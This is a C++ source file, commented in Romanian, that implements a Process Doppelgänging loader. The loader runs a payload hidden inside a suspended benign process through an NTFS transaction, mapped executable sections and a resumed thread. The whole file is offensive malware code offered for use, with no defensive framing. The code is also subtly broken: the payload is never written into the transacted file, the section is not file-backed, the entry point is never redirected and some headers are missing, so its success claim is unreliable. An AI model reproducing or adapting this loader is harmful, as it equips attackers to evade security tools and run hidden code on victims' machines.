#include <Windows.h>
#include <iostream>
#include <string>

namespace ShadowToken {

    class ProcessDoppelganger {
    public:
        // Inițializează un payload folosind Process Doppelgänging
        bool LaunchDoppelganger(const std::wstring& targetExecutable, const std::wstring& payloadPath) {
            HANDLE hTransaction = CreateTransaction(nullptr, 0, 0, 0, 0, 0, nullptr);
            if (hTransaction == INVALID_HANDLE_VALUE) {
                std::cerr << "[Error] Nu s-a putut crea tranzacția: " << GetLastError() << std::endl;
                return false;
            }

            HANDLE hTransactedFile = CreateFileTransacted(
                payloadPath.c_str(),
                GENERIC_WRITE,
                0,
                nullptr,
                CREATE_ALWAYS,
                FILE_ATTRIBUTE_NORMAL,
                nullptr,
                hTransaction,
                nullptr,
                nullptr
            );

            if (hTransactedFile == INVALID_HANDLE_VALUE) {
                std::cerr << "[Error] Nu s-a putut crea fișierul tranzacțional: " << GetLastError() << std::endl;
                CloseHandle(hTransaction);
                return false;
            }

            // Deschidere proces benign suspendat
            STARTUPINFOEXW si = { sizeof(STARTUPINFOEXW) };
            PROCESS_INFORMATION pi;
            if (!CreateProcessW(targetExecutable.c_str(), nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si.StartupInfo, &pi)) {
                std::cerr << "[Error] Nu s-a putut crea procesul țintă: " << GetLastError() << std::endl;
                CloseHandle(hTransaction);
                CloseHandle(hTransactedFile);
                return false;
            }

            // Creează secțiunea de memorie pentru payload
            HANDLE hSection;
            if (!NT_SUCCESS(NtCreateSection(&hSection, SECTION_ALL_ACCESS, nullptr, nullptr, PAGE_EXECUTE_READWRITE, SEC_COMMIT, hTransaction))) {
                std::cerr << "[Error] Nu s-a putut crea secțiunea: " << GetLastError() << std::endl;
                TerminateProcess(pi.hProcess, 1);
                CloseHandle(hTransaction);
                CloseHandle(hTransactedFile);
                return false;
            }

            // Mapează secțiunea în procesul curent și în procesul țintă
            PVOID localMap = nullptr, remoteMap = nullptr;
            SIZE_T viewSize = 0;
            if (!NT_SUCCESS(NtMapViewOfSection(hSection, GetCurrentProcess(), &localMap, 0, 0, nullptr, &viewSize, ViewUnmap, 0, PAGE_READWRITE)) ||
                !NT_SUCCESS(NtMapViewOfSection(hSection, pi.hProcess, &remoteMap, 0, 0, nullptr, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READ))) {
                std::cerr << "[Error] Nu s-a putut mapa secțiunea." << std::endl;
                CloseHandle(hSection);
                TerminateProcess(pi.hProcess, 1);
                CloseHandle(hTransaction);
                CloseHandle(hTransactedFile);
                return false;
            }

            // Copiază payload-ul în secțiunea mapată
            std::ifstream payloadFile(payloadPath, std::ios::binary);
            if (!payloadFile.is_open()) {
                std::cerr << "[Error] Nu s-a putut deschide payload-ul." << std::endl;
                return false;
            }
            payloadFile.seekg(0, std::ios::end);
            size_t payloadSize = payloadFile.tellg();
            payloadFile.seekg(0, std::ios::beg);
            payloadFile.read(reinterpret_cast<char*>(localMap), payloadSize);
            payloadFile.close();

            // Reluare proces pentru execuția payload-ului injectat
            ResumeThread(pi.hThread);

            std::cout << "[Info] Process Doppelgänging realizat cu succes. Proces lansat." << std::endl;

            // Cleanup
            CloseHandle(hSection);
            CloseHandle(hTransaction);
            CloseHandle(hTransactedFile);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return true;
        }
    };
}
